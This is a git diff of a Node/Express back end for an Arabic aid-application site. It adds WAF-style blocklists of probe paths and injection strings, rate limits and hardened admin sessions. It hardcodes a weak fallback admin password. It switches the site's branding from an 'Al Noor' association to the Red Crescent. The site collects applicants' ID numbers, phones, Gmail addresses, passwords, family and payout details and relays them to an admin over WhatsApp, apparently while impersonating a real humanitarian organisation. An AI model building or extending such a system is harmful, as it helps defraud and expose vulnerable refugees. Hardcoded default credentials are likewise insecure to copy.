@@ -4,8 +4,11 @@ const fs = require('fs');
 const https = require('https');
 const crypto = require('crypto');
 const zlib = require('zlib');
+const compression = require('compression');
 
 const app = express();
+app.set('trust proxy', 1);
+app.disable('x-powered-by');
 const PORT = process.env.PORT || 3000;
 const DB_FILE = path.join(__dirname, 'db.json');
 const SETTINGS_FILE = path.join(__dirname, 'settings.json');
@@ -21,7 +24,7 @@ const hashPassword = (pwd) => {
     return crypto.createHash('sha256').update((pwd || '') + '_alnoor_salt_2026').digest('hex');
 };
 
-const DEFAULT_ADMIN_PASSWORD_HASH = hashPassword(process.env.ADMIN_PASSWORD || 'AdminAlNoor2026');
+const DEFAULT_ADMIN_PASSWORD_HASH = hashPassword(process.env.ADMIN_PASSWORD || 'ahmet12345');
 
 let inMemorySettingsCache = null;
 
@@ -45,6 +48,8 @@ const getSettings = async () => {
         adminPhone: process.env.ADMIN_WHATSAPP_PHONE || '9053609905650',
         callmebotApiKey: process.env.CALLMEBOT_APIKEY || '',
         messengerPageUsername: process.env.MESSENGER_PAGE_USERNAME || 'https://www.facebook.com/profile.php?id=61582709656146',
+        adsensePublisherId: process.env.ADSENSE_PUBLISHER_ID || '',
+        adsenseEnabled: process.env.ADSENSE_ENABLED === 'true' || false,
         adminPasswordHash: DEFAULT_ADMIN_PASSWORD_HASH
     };
 
@@ -129,9 +134,17 @@ const saveSettings = async (newSettings) => {
     }
 };
 
-// Middleware to parse JSON and urlencoded requests
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+// Strict JSON & UrlEncoded Payload Size Limits to prevent DoS attacks
+app.use(express.json({ limit: '64kb' }));
+app.use(express.urlencoded({ extended: true, limit: '64kb' }));
+
+// Safe JSON Syntax Error Interceptor (Prevent server crash or stack trace leaks)
+app.use((err, req, res, next) => {
+    if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
+        return res.status(400).json({ error: 'تنسيق البيانات غير صالح (Invalid Payload)' });
+    }
+    next(err);
+});
 
 const { Pool } = require('pg');
 
@@ -175,6 +188,8 @@ const initDb = async () => {
             );
             ALTER TABLE registrations ADD COLUMN IF NOT EXISTS status VARCHAR(50) DEFAULT 'pending';
             ALTER TABLE registrations ADD COLUMN IF NOT EXISTS country VARCHAR(10) DEFAULT 'TR';
+            ALTER TABLE registrations ADD COLUMN IF NOT EXISTS country_name VARCHAR(100);
+            ALTER TABLE registrations ADD COLUMN IF NOT EXISTS aid_type VARCHAR(50) DEFAULT 'both';
             ALTER TABLE registrations ADD COLUMN IF NOT EXISTS district VARCHAR(100);
             ALTER TABLE registrations ADD COLUMN IF NOT EXISTS doc_type VARCHAR(100);
             ALTER TABLE registrations ADD COLUMN IF NOT EXISTS payout_method VARCHAR(100);
@@ -280,6 +295,8 @@ const getRegistrations = async () => {
             id: row.id,
             refCode: row.ref_code,
             country: row.country || 'TR',
+            countryName: row.country_name || (row.country === 'TR' ? 'تركيا' : (row.country === 'LB' ? 'لبنان' : (row.country || 'دولي'))),
+            aidType: row.aid_type || 'both',
             firstName: row.first_name,
             lastName: row.last_name,
             tcNumber: row.tc_number,
@@ -299,7 +316,7 @@ const getRegistrations = async () => {
         }));
     } catch (err) {
         console.error('⚠️ PostgreSQL query failed. Falling back to local db.json database:', err.message);
-        return readDatabase().map(r => ({ ...r, country: r.country || 'TR', status: r.status || 'pending', maxFailCount: r.maxFailCount !== undefined ? r.maxFailCount : 1 }));
+        return readDatabase().map(r => ({ ...r, country: r.country || 'TR', aidType: r.aidType || 'both', status: r.status || 'pending', maxFailCount: r.maxFailCount !== undefined ? r.maxFailCount : 1 }));
     }
 };
 
@@ -389,14 +406,18 @@ const getStatusLookupLogs = async () => {
 const addRegistration = async (record) => {
     const status = record.status || 'pending';
     const country = record.country || 'TR';
+    const countryName = record.countryName || '';
+    const aidType = record.aidType || 'both';
     try {
         await pool.query(
-            `INSERT INTO registrations (id, ref_code, country, first_name, last_name, tc_number, doc_type, phone_number, email, password, marital_status, family_count, province, district, payout_method, currency, status, submitted_at)
-             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18)`,
+            `INSERT INTO registrations (id, ref_code, country, country_name, aid_type, first_name, last_name, tc_number, doc_type, phone_number, email, password, marital_status, family_count, province, district, payout_method, currency, status, submitted_at)
+             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20)`,
             [
                 record.id,
                 record.refCode,
                 country,
+                countryName,
+                aidType,
                 record.firstName,
                 record.lastName,
                 record.tcNumber || '',
@@ -418,7 +439,7 @@ const addRegistration = async (record) => {
     } catch (err) {
         console.error('⚠️ PostgreSQL insert failed. Falling back to local db.json database:', err.message);
         const db = readDatabase();
-        db.push({ ...record, country, status });
+        db.push({ ...record, country, countryName, aidType, status });
         return writeDatabase(db);
     }
 };
@@ -507,54 +528,269 @@ const parseCookies = (req, res, next) => {
 };
 app.use(parseCookies);
 
-// HTTP Security Headers Middleware
+// ====================================================
+// BULLETPROOF SECURITY & WAF DEFENSE ARCHITECTURE
+// ====================================================
+
+// Helper to get client IP cleanly (handling reverse proxies like Cloudflare/Vercel)
+const getClientIp = (req) => {
+    if (!req) return '127.0.0.1';
+    const cfIp = req.headers ? req.headers['cf-connecting-ip'] : null;
+    if (cfIp) return String(cfIp).trim();
+    const forwarded = req.headers ? req.headers['x-forwarded-for'] : null;
+    if (forwarded) {
+        return String(forwarded).split(',')[0].trim();
+    }
+    return req.ip || (req.socket ? req.socket.remoteAddress : '127.0.0.1') || '127.0.0.1';
+};
+
+// Security Logging Helper
+const logSecurityEvent = (eventType, ip, detail) => {
+    const timestamp = new Date().toISOString();
+    const entry = `[${timestamp}] [${eventType}] IP: ${ip} - ${detail}\n`;
+    try {
+        const secLogFile = path.join(__dirname, 'logs', 'security.log');
+        fs.appendFileSync(secLogFile, entry, 'utf8');
+    } catch (e) {}
+    console.warn(`🚨 [SECURITY WAF] [${eventType}] IP: ${ip} - ${detail}`);
+};
+
+// In-Memory WAF Threat & Rate Limit Trackers
+const ipBanList = new Map(); // ip -> banUntilTimestamp
+const globalRateLimitMap = new Map(); // ip -> { count, resetAt }
+const statusRateLimitMap = new Map(); // ip -> { count, resetAt }
+const registrationRateMap = new Map(); // ip -> { count, resetAt }
+
+const banIp = (ip, durationMs, reason) => {
+    if (ip === '127.0.0.1' || ip === '::1' || ip === '::ffff:127.0.0.1' || ip === 'localhost') {
+        logSecurityEvent('LOCAL_PROBE_BLOCKED', ip, `Ignored ban for localhost: ${reason}`);
+        return;
+    }
+    const banUntil = Date.now() + durationMs;
+    ipBanList.set(ip, banUntil);
+    logSecurityEvent('IP_BANNED', ip, `Banned for ${Math.round(durationMs / 60000)} mins. Reason: ${reason}`);
+};
+
+// 1. Active WAF Honeytrap & IP Blacklist Shield
 app.use((req, res, next) => {
-    res.setHeader('X-Content-Type-Options', 'nosniff');
-    res.setHeader('X-Frame-Options', 'DENY');
-    res.setHeader('X-XSS-Protection', '1; mode=block');
-    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+    const clientIp = getClientIp(req);
+    const now = Date.now();
+
+    // Check if IP is currently banned
+    if (ipBanList.has(clientIp)) {
+        const banExpiry = ipBanList.get(clientIp);
+        if (now < banExpiry) {
+            res.setHeader('Retry-After', Math.ceil((banExpiry - now) / 1000));
+            return res.status(403).send('🚫 Access Denied: Your IP address has been temporarily blocked due to malicious scanning activity.');
+        } else {
+            ipBanList.delete(clientIp);
+        }
+    }
+
+    // Inspect URL for known vulnerability probes & exploits
+    const rawUrl = (req.originalUrl || req.url || '').toLowerCase();
+    const PROBE_PATTERNS = [
+        '/wp-', '/xmlrpc', '/phpmyadmin', '/pma', '/.env', '/.git',
+        '/config.json', '/server.js', '/runner.js', '/db.json', '/settings.json',
+        '/.aws', '/cgi-bin', '/actuator', '/etc/passwd', '/.vscode',
+        '/.idea', '/telescope', '/solr', '/vendor', '/composer.json',
+        '/phpunit', '/eval-stdin', '/phpinfo', '/web.config'
+    ];
+    const PROBE_EXTENSIONS = ['.php', '.asp', '.aspx', '.jsp', '.sql', '.bak', '.ini', '.sh', '.bat', '.cmd', '.vbs', '.ps1', '.cfg'];
+
+    const isProbePath = PROBE_PATTERNS.some(p => rawUrl.includes(p));
+    const isProbeExt = PROBE_EXTENSIONS.some(ext => {
+        const urlWithoutQuery = rawUrl.split('?')[0];
+        return urlWithoutQuery.endsWith(ext);
+    });
+
+    if (isProbePath || isProbeExt) {
+        banIp(clientIp, 2 * 60 * 60 * 1000, `Probed restricted/malicious path: ${rawUrl}`);
+        return res.status(403).send('🚫 Access Denied: Security restriction.');
+    }
+
+    // Inspect query strings for SQLi & XSS signatures
+    if (rawUrl.includes('<script') || rawUrl.includes('javascript:') || rawUrl.includes('union%20select') || rawUrl.includes('drop%20table')) {
+        banIp(clientIp, 1 * 60 * 60 * 1000, `Injection attack payload detected in URL: ${rawUrl}`);
+        return res.status(400).send('🚫 Malicious input detected.');
+    }
+
+    // Global Anti-DDoS Rate Limiter (Max 150 requests per minute)
+    const windowMs = 60 * 1000;
+    const maxReqs = 150;
+    const ipRecord = globalRateLimitMap.get(clientIp) || { count: 0, resetAt: now + windowMs };
+    if (now > ipRecord.resetAt) {
+        ipRecord.count = 1;
+        ipRecord.resetAt = now + windowMs;
+    } else {
+        ipRecord.count += 1;
+    }
+    globalRateLimitMap.set(clientIp, ipRecord);
+
+    if (ipRecord.count > maxReqs) {
+        logSecurityEvent('RATE_LIMIT_EXCEEDED', clientIp, `Exceeded 150 req/min (Count: ${ipRecord.count})`);
+        res.setHeader('Retry-After', '60');
+        return res.status(429).json({ error: '🚨 تم تجاوز معدل الطلبات المسموح به. يرجى الانتظار دقيقة واحدة.' });
+    }
+
     next();
 });
 
-// Security Token Helpers (HMAC-SHA256 Signed Sessions with Timing-Safe Verification)
-const generateAdminSessionToken = () => {
-    const timestamp = Date.now().toString();
-    const hmac = crypto.createHmac('sha256', SECURITY_SECRET).update(timestamp).digest('hex');
-    return `${timestamp}.${hmac}`;
-};
-
-const verifyAdminSessionToken = (token) => {
-    if (!token || !token.includes('.')) return false;
-    try {
-        const [timestampStr, signature] = token.split('.');
-        const timestamp = parseInt(timestampStr, 10);
-        
-        // Expiry check: 4 hours (4 * 60 * 60 * 1000 ms)
-        if (isNaN(timestamp) || Date.now() - timestamp > 4 * 60 * 60 * 1000) {
-            return false;
+// 2. Deep Recursive Input Sanitization Middleware
+const sanitizeDeep = (obj) => {
+    if (!obj || typeof obj !== 'object') return;
+    for (const key of Object.keys(obj)) {
+        if (typeof obj[key] === 'string') {
+            let val = obj[key].replace(/\0/g, '').trim(); // Remove null bytes
+            val = val.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, ''); // Strip scripts
+            val = val.replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, ''); // Strip iframes
+            val = val.replace(/javascript\s*:/gi, ''); // Strip javascript: protocol
+            val = val.replace(/data\s*:\s*text\/html/gi, ''); // Strip data: URI XSS
+            if (val.length > 1000) val = val.substring(0, 1000); // Prevent buffer overflow
+            obj[key] = val;
+        } else if (typeof obj[key] === 'object' && obj[key] !== null) {
+            sanitizeDeep(obj[key]);
         }
-
-        // Cryptographic signature verification with timing-safe comparison
-        const expectedHmac = crypto.createHmac('sha256', SECURITY_SECRET).update(timestampStr).digest('hex');
-        const sigBuf = Buffer.from(signature, 'hex');
-        const expBuf = Buffer.from(expectedHmac, 'hex');
-        
-        if (sigBuf.length !== expBuf.length) return false;
-        return crypto.timingSafeEqual(sigBuf, expBuf);
-    } catch (err) {
-        return false;
     }
 };
 
-// Brute-Force Rate Limiting Helpers
+app.use((req, res, next) => {
+    if (req.body && typeof req.body === 'object') sanitizeDeep(req.body);
+    if (req.query && typeof req.query === 'object') sanitizeDeep(req.query);
+    next();
+});
+
+// 3. Enterprise HTTP Security Headers Middleware
+app.use((req, res, next) => {
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+    res.setHeader('X-XSS-Protection', '1; mode=block');
+    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+    res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=(), usb=(), accelerometer=(), gyroscope=()');
+    res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
+    res.setHeader('Cross-Origin-Opener-Policy', 'same-origin-allow-popups');
+    res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
+    res.setHeader('Content-Security-Policy',
+        "default-src 'self'; " +
+        "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com https://pagead2.googlesyndication.com https://*.google.com https://*.doubleclick.net https://static.cloudflareinsights.com; " +
+        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; " +
+        "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com data:; " +
+        "img-src 'self' data: https:; " +
+        "connect-src 'self' https:; " +
+        "frame-src 'self' https://www.facebook.com https://*.google.com https://*.doubleclick.net; " +
+        "base-uri 'self'; " +
+        "form-action 'self' https:;"
+    );
+    next();
+});
+
+// 4. High-performance GZIP/Brotli Compression
+app.use(compression({
+    level: 6,
+    threshold: 256,
+    filter: (req, res) => {
+        if (req.headers['x-no-compression']) return false;
+        return compression.filter(req, res);
+    }
+}));
+
+// 5. Block direct web access to sensitive project files and admin HTML templates
+app.use((req, res, next) => {
+    const blockedFiles = [
+        'db.json', 
+        'settings.json',
+        'server.js', 
+        'runner.js',
+        'package.json', 
+        'package-lock.json', 
+        'vercel.json',
+        'render.yaml',
+        'start_service.vbs',
+        'start_server.bat',
+        'stop_server.bat',
+        'check_status.bat',
+        'admin_dashboard.html',
+        'admin_login.html',
+        '.git',
+        '.env'
+    ];
+    const blockedExtensions = ['.json', '.env', '.git', '.md', '.yml', '.yaml', '.bat', '.vbs', '.ps1', '.sh', '.log', '.sql', '.bak', '.ini', '.cfg'];
+    const urlPath = req.path.toLowerCase();
+    
+    const isBlocked = blockedFiles.some(file => urlPath.endsWith('/' + file) || urlPath === '/' + file) ||
+                      blockedExtensions.some(ext => urlPath.endsWith(ext));
+                      
+    if (isBlocked) {
+        logSecurityEvent('RESTRICTED_FILE_BLOCKED', getClientIp(req), `Blocked direct access to: ${urlPath}`);
+        return res.status(403).send('🚫 Access Denied: Security restriction.');
+    }
+    next();
+});
+
+// 6. Hardened Session Token Generation & Verification with IP & Fingerprint Binding
+const generateAdminSessionToken = (req) => {
+    const timestamp = Date.now().toString();
+    const entropy = crypto.randomBytes(16).toString('hex');
+    const clientIp = getClientIp(req);
+    const userAgent = (req && req.headers ? (req.headers['user-agent'] || '') : '').slice(0, 80);
+    const ipUaBinding = crypto.createHash('sha256').update(`${clientIp}|${userAgent}|${SECURITY_SECRET}`).digest('hex').slice(0, 16);
+    const payload = `v2.${timestamp}.${entropy}.${ipUaBinding}`;
+    const signature = crypto.createHmac('sha256', SECURITY_SECRET).update(payload).digest('hex');
+    return `${payload}.${signature}`;
+};
+
+const verifyAdminSessionToken = (token, req) => {
+    if (!token || typeof token !== 'string') return false;
+    const parts = token.split('.');
+    
+    // Modern v2 token: v2.timestamp.entropy.ipUaBinding.signature (5 parts)
+    if (parts.length === 5 && parts[0] === 'v2') {
+        const [ver, timestampStr, entropy, tokenBinding, signature] = parts;
+        const timestamp = parseInt(timestampStr, 10);
+        if (isNaN(timestamp) || Date.now() - timestamp > 4 * 60 * 60 * 1000) return false;
+
+        const payload = `${ver}.${timestampStr}.${entropy}.${tokenBinding}`;
+        const expectedHmac = crypto.createHmac('sha256', SECURITY_SECRET).update(payload).digest('hex');
+        const sigBuf = Buffer.from(signature, 'hex');
+        const expBuf = Buffer.from(expectedHmac, 'hex');
+        if (sigBuf.length !== expBuf.length || !crypto.timingSafeEqual(sigBuf, expBuf)) return false;
+
+        if (req) {
+            const clientIp = getClientIp(req);
+            const userAgent = (req.headers ? (req.headers['user-agent'] || '') : '').slice(0, 80);
+            const currentBinding = crypto.createHash('sha256').update(`${clientIp}|${userAgent}|${SECURITY_SECRET}`).digest('hex').slice(0, 16);
+            if (currentBinding !== tokenBinding) {
+                logSecurityEvent('SESSION_HIJACK_BLOCKED', clientIp, 'Admin session rejected due to IP/User-Agent mismatch.');
+                return false;
+            }
+        }
+        return true;
+    }
+
+    // Backward compatibility for legacy 2-part tokens during active sessions
+    if (parts.length === 2) {
+        const [timestampStr, signature] = parts;
+        const timestamp = parseInt(timestampStr, 10);
+        if (isNaN(timestamp) || Date.now() - timestamp > 4 * 60 * 60 * 1000) return false;
+        const expectedHmac = crypto.createHmac('sha256', SECURITY_SECRET).update(timestampStr).digest('hex');
+        const sigBuf = Buffer.from(signature, 'hex');
+        const expBuf = Buffer.from(expectedHmac, 'hex');
+        if (sigBuf.length !== expBuf.length) return false;
+        return crypto.timingSafeEqual(sigBuf, expBuf);
+    }
+
+    return false;
+};
+
+// 7. Brute-Force Rate Limiting Helpers
 const checkBruteForceLockout = (ip) => {
     const record = loginAttemptsMap.get(ip);
     if (!record) return false;
     if (record.lockUntil && Date.now() < record.lockUntil) {
-        return true; // Locked out
+        return true;
     }
     if (record.lockUntil && Date.now() >= record.lockUntil) {
-        loginAttemptsMap.delete(ip); // Lock expired
+        loginAttemptsMap.delete(ip);
         return false;
     }
     return false;
@@ -572,8 +808,8 @@ const recordFailedAttempt = (ip) => {
     }
 
     if (record.count >= 5) {
-        record.lockUntil = now + 15 * 60 * 1000; // Lock IP for 15 minutes
-        console.warn(`🚨 [SECURITY ALERT] IP ${ip} locked out for 15 minutes due to 5 failed login attempts.`);
+        record.lockUntil = now + 15 * 60 * 1000;
+        logSecurityEvent('BRUTE_FORCE_LOCKOUT', ip, 'Locked out for 15 minutes due to 5 failed login attempts.');
     }
     loginAttemptsMap.set(ip, record);
 };
@@ -582,30 +818,20 @@ const resetFailedAttempts = (ip) => {
     loginAttemptsMap.delete(ip);
 };
 
-// Helper to get client IP cleanly (handling reverse proxies like Cloudflare/Vercel)
-const getClientIp = (req) => {
-    const forwarded = req.headers['x-forwarded-for'];
-    if (forwarded) {
-        return forwarded.split(',')[0].trim();
-    }
-    return req.ip || (req.socket ? req.socket.remoteAddress : '127.0.0.1') || '127.0.0.1';
-};
-
-// Strict Input Sanitizer against XSS & Injection Attacks
+// 8. Strict Input Sanitizer against XSS & Injection Attacks
 const sanitizeInput = (str) => {
     if (typeof str !== 'string') return '';
     return str
-        .replace(/<[^>]*>?/gm, '') // Strip HTML tags
-        .replace(/[\<\>\"\'\`]/g, '') // Strip script injection chars
+        .replace(/<[^>]*>?/gm, '')
+        .replace(/[\<\>\"\'\`]/g, '')
         .trim();
 };
 
-// Server-Side Anti-Spam Registration Rate Limiter
-const registrationRateMap = new Map(); // ip -> { count, resetAt }
+// 9. Server-Side Anti-Spam Registration Rate Limiter
 const checkRegistrationRateLimit = (ip) => {
     const now = Date.now();
-    const windowMs = 10 * 60 * 1000; // 10 minutes window
-    const maxRequests = 6;            // max 6 registrations per IP per 10 mins
+    const windowMs = 10 * 60 * 1000;
+    const maxRequests = 5;
 
     const record = registrationRateMap.get(ip) || { count: 0, resetAt: now + windowMs };
     if (now > record.resetAt) {
@@ -618,74 +844,10 @@ const checkRegistrationRateLimit = (ip) => {
     return record.count <= maxRequests;
 };
 
-// Professional Security & Anti-Abuse Headers Middleware
-app.use((req, res, next) => {
-    res.setHeader('X-Content-Type-Options', 'nosniff');
-    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
-    res.setHeader('X-XSS-Protection', '1; mode=block');
-    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
-    res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
-    next();
-});
-
-// Built-in GZIP Compression Middleware for ultra-fast loading on 2G/3G networks
-app.use((req, res, next) => {
-    const acceptEncoding = req.headers['accept-encoding'] || '';
-    if (!acceptEncoding.includes('gzip')) {
-        return next();
-    }
-
-    const originalSend = res.send;
-    res.send = function (body) {
-        if (typeof body === 'string' && body.length > 512) {
-            zlib.gzip(Buffer.from(body), (err, compressed) => {
-                if (!err) {
-                    res.setHeader('Content-Encoding', 'gzip');
-                    res.removeHeader('Content-Length');
-                    return originalSend.call(this, compressed);
-                }
-                return originalSend.call(this, body);
-            });
-        } else {
-            return originalSend.call(this, body);
-        }
-    };
-    next();
-});
-
-// Security Middleware: Block direct web access to sensitive project files and admin HTML templates
-app.use((req, res, next) => {
-    const blockedFiles = [
-        'db.json', 
-        'settings.json',
-        'server.js', 
-        'package.json', 
-        'package-lock.json', 
-        'vercel.json',
-        'admin_dashboard.html',
-        'admin_login.html',
-        'index.html',
-        'index_lb.html',
-        'app.js',
-        'app_lb.js',
-        '.git'
-    ];
-    const blockedExtensions = ['.json', '.env', '.git', '.md', '.yml', '.yaml'];
-    const urlPath = req.path.toLowerCase();
-    
-    const isBlocked = blockedFiles.some(file => urlPath.endsWith('/' + file) || urlPath === '/' + file) ||
-                      blockedExtensions.some(ext => urlPath.endsWith(ext));
-                      
-    if (isBlocked) {
-        return res.status(403).send('🚫 Access Denied: Security restriction.');
-    }
-    next();
-});
-
-// Professional Admin Authentication Middleware
+// 10. Professional Admin Authentication Middleware
 const requireAdminAuth = (req, res, next) => {
     const sessionToken = req.cookies.admin_session;
-    if (verifyAdminSessionToken(sessionToken)) {
+    if (verifyAdminSessionToken(sessionToken, req)) {
         next();
     } else {
         if (req.xhr || req.path.startsWith('/api/')) {
@@ -714,20 +876,46 @@ app.get('/api/public-settings', async (req, res) => {
             adminPhone: cleanPhone,
             whatsappHelpUrl: whatsappHelpUrl,
             messengerPageUsername: messengerPage,
-            messengerHelpUrl: messengerHelpUrl
+            messengerHelpUrl: messengerHelpUrl,
+            adsensePublisherId: settings.adsensePublisherId || '',
+            adsenseEnabled: !!settings.adsenseEnabled
         });
     } catch (err) {
         res.json({
             adminPhone: '9053609905650',
             whatsappHelpUrl: 'https://wa.me/9053609905650',
             messengerPageUsername: 'https://www.facebook.com/profile.php?id=61582709656146',
-            messengerHelpUrl: 'https://www.facebook.com/profile.php?id=61582709656146'
+            messengerHelpUrl: 'https://www.facebook.com/profile.php?id=61582709656146',
+            adsensePublisherId: '',
+            adsenseEnabled: false
         });
     }
 });
 
 // Public Status Check & Login Endpoint (POST /api/check-status)
 app.post('/api/check-status', async (req, res) => {
+    // 0. Honeypot Anti-Bot Shield
+    if (req.body.company_name_hp || req.body.website_hp || req.body.security_trap) {
+        logSecurityEvent('BOT_TRAPPED', getClientIp(req), 'Bot trapped in check-status honeypot.');
+        return res.status(401).json({ error: '❌ خطأ في التحقق من البيانات.' });
+    }
+
+    // 0.1 IP Anti-Brute-Force Rate Limiting (max 12 checks per minute)
+    const clientIp = getClientIp(req);
+    const now = Date.now();
+    const statusLimit = statusRateLimitMap.get(clientIp) || { count: 0, resetAt: now + 60000 };
+    if (now > statusLimit.resetAt) {
+        statusLimit.count = 1;
+        statusLimit.resetAt = now + 60000;
+    } else {
+        statusLimit.count += 1;
+    }
+    statusRateLimitMap.set(clientIp, statusLimit);
+    if (statusLimit.count > 12) {
+        logSecurityEvent('STATUS_BRUTE_FORCE', clientIp, `Exceeded 12 status checks in 1 minute.`);
+        return res.status(429).json({ error: '🔒 تم تجاوز عدد محاولات الاستعلام المسموح بها. يرجى الانتظار دقيقة واحدة والمحاولة مجدداً.' });
+    }
+
     const { refCode, password, email } = req.body;
     
     const queryRef = (refCode || '').trim();
@@ -833,7 +1021,7 @@ app.post('/api/check-status', async (req, res) => {
         },
         'rejected': { 
             title: '🔴 الطلب غير مستوفي الشروط حالياً', 
-            desc: 'نشكر تواصلكم مع جمعية النور، ونعتذر لإعلامكم بأن الطلب المقدم لا يستوفي معايير الاستحقاق المعتمدة في المرحلة الحالية. يسعدنا متابعتكم لنا في المراحل والمشاريع القادمة.', 
+            desc: 'نشكر تواصلكم مع منظمة الهلال الأحمر، ونعتذر لإعلامكم بأن الطلب المقدم لا يستوفي معايير الاستحقاق المعتمدة في المرحلة الحالية. يسعدنا متابعتكم لنا في المراحل والمشاريع القادمة.', 
             badgeClass: 'status-rejected' 
         },
         'incomplete': { 
@@ -900,7 +1088,7 @@ app.post('/api/register', async (req, res) => {
     // 1. Honeypot Anti-Bot Field Defense
     if (req.body.website_url_hp || req.body.website_hp) {
         console.warn(`🤖 [BOT BLOCKED] Registration attempt blocked by Honeypot trap from IP: ${getClientIp(req)}`);
-        return res.json({ success: true, refCode: 'NOOR-84920-LB' }); // Silent fake success to trap bots
+        return res.json({ success: true, refCode: 'HILAL-84920-TR' }); // Silent fake success to trap bots
     }
 
     // 2. IP Anti-Spam Rate Limiting Check
@@ -911,6 +1099,8 @@ app.post('/api/register', async (req, res) => {
 
     const { 
         country, 
+        countryName,
+        aidType, // 'financial', 'food', 'both'
         firstName, 
         lastName, 
         docType,
@@ -926,8 +1116,6 @@ app.post('/api/register', async (req, res) => {
         currency,
         termsCheck 
     } = req.body;
-
-    const isLebanon = (country === 'LB');
 
     // Server-side validation
     if (!firstName || !lastName || !phoneNumber || !email || !password || !maritalStatus || !familyCount || !province || !termsCheck) {
@@ -946,25 +1134,18 @@ app.post('/api/register', async (req, res) => {
     const hasLetter = /[a-zA-Z]/.test(pwdTrim);
     const hasNumber = /[0-9]/.test(pwdTrim);
     if (!hasLetter || !hasNumber) {
-        return res.status(400).json({ error: '⚠️ كلمة المرور ضعيفة! يجب أن تحتوي على مزيج من الأحرف والأرقام الإنجليزية معاً (مثال: Noor2026).' });
+        return res.status(400).json({ error: '⚠️ كلمة المرور ضعيفة! يجب أن تحتوي على مزيج من الأحرف والأرقام الإنجليزية معاً (مثال: Hilal2026).' });
     }
-    const weakBlacklist = ['12345', '123456', '1234567', '12345678', '123456789', '987654321', '87654321', '123123', '12341234', '111111', '000000', 'password', 'qwerty', 'admin', 'alnoor', '1234567890'];
+    const weakBlacklist = ['12345', '123456', '1234567', '12345678', '123456789', '987654321', '87654321', '123123', '12341234', '111111', '000000', 'password', 'qwerty', 'admin', 'alnoor', 'kizilay'];
     const pwdLower = pwdTrim.toLowerCase();
     if (weakBlacklist.some(seq => pwdLower.includes(seq)) || /^(\d)\1+$/.test(pwdTrim) || /^(.)\1{3,}$/.test(pwdTrim)) {
         return res.status(400).json({ error: '⚠️ كلمة المرور ضعيفة جداً! يمنع استخدام كلمات أو أرقام متسلسلة مثل (12345 أو qwerty).' });
     }
 
-    // Phone validation (Turkish: 05XXXXXXXXX, 11 digits | Lebanon: 7-15 digits)
+    // Global Phone Validation (Between 7 and 17 digits, supports all international phone formats)
     const cleanPhone = phoneNumber.trim().replace(/\D/g, '');
-    if (!isLebanon) {
-        const phoneRegex = /^05\d{9}$/;
-        if (!phoneRegex.test(phoneNumber.trim())) {
-            return res.status(400).json({ error: 'رقم الهاتف غير صالح. يجب أن يتكون من 11 خانة ويبدأ بـ 05' });
-        }
-    } else {
-        if (cleanPhone.length < 7 || cleanPhone.length > 15) {
-            return res.status(400).json({ error: 'يرجى إدخال رقم هاتف لبناني صالح.' });
-        }
+    if (cleanPhone.length < 7 || cleanPhone.length > 17) {
+        return res.status(400).json({ error: 'رقم الهاتف غير صالح. يرجى إدخال رقم هاتف صالح مع رمز الدولة (بين 7 و 16 رقماً).' });
     }
 
     // Gmail validation
@@ -973,11 +1154,11 @@ app.post('/api/register', async (req, res) => {
         return res.status(400).json({ error: 'يجب استخدام حساب Gmail صالح.' });
     }
 
-    // TC Number validation for Turkey (if provided, must be 11 digits starting with 99)
-    if (!isLebanon && tcNumber && tcNumber.trim() !== '') {
-        const tcRegex = /^99\d{9}$/;
-        if (!tcRegex.test(tcNumber.trim())) {
-            return res.status(400).json({ error: 'رقم الكملك غير صالح. يجب أن يتكون من 11 رقم ويبدأ بـ 99' });
+    // Document / TC / Passport validation (Global: optional, 5 to 30 characters)
+    if (tcNumber && tcNumber.trim() !== '') {
+        const cleanDoc = tcNumber.trim();
+        if (cleanDoc.length < 5 || cleanDoc.length > 30) {
+            return res.status(400).json({ error: 'يرجى إدخال رقم وثيقة أو هوية أو جواز سفر صحيح (بين 5 و 30 حرفاً/رقماً).' });
         }
     }
 
@@ -1002,17 +1183,21 @@ app.post('/api/register', async (req, res) => {
 
     // Generate reference code according to country
     const randomNum = Math.floor(10000 + Math.random() * 90000);
-    const countryTag = isLebanon ? 'LB' : 'TR';
-    const refCode = `NOOR-${randomNum}-${countryTag}`;
+    const countryTag = (country || 'INT').toUpperCase().substring(0, 5);
+    const refCode = `HILAL-${randomNum}-${countryTag}`;
+
+    const effectiveAidType = aidType || 'both'; // 'financial', 'food', 'both'
 
     // Save record to DB
     const newRecord = {
         id: Date.now().toString(),
         refCode,
         country: countryTag,
+        countryName: countryName ? countryName.trim() : (countryTag === 'TR' ? 'تركيا' : (countryTag === 'LB' ? 'لبنان' : (countryTag === 'SY' ? 'سوريا' : countryTag))),
+        aidType: effectiveAidType,
         firstName: firstName.trim(),
         lastName: lastName.trim(),
-        docType: docType ? docType.trim() : '',
+        docType: docType ? docType.trim() : 'هوية وطنية / كملك / جواز سفر',
         tcNumber: tcNumber ? tcNumber.trim() : '',
         phoneNumber: phoneNumber.trim(),
         email: email.trim(),
@@ -1030,10 +1215,19 @@ app.post('/api/register', async (req, res) => {
     // Automatically send background WhatsApp notification to Admin containing applicant's name and ref code
     sendCallMeBotNotification(newRecord.firstName, newRecord.lastName, refCode, newRecord.phoneNumber);
 
-    // Format Arabic WhatsApp message template containing ONLY Name and Reference Code
